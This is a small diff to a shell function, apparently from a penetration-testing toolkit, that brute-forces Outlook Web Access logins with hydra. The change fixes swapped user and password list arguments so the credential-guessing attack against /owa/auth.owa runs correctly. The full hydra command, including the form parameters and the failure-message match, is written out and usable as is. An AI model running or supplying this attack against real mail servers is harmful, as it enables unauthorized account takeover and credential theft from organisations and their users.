@@ -27,9 +27,9 @@ owabrute(){
             local PASSLIST="${3}"
 
             hydra -V            \
-                -L "${PASSLIST}"  \
+                -L "${USERSLIST}"  \
                 -e s            \
-                -P "${USERSLIST}" \
+                -P "${PASSLIST}" \
                 "${DOMAIN}"       \
                 https-post-form "/owa/auth.owa:flags=4&destination=https\://${DOMAIN}/owa/&forcedownlevel=0&username=^USER^&password=^PASS^&isUtf8=1:F=The user name or password"
         fi
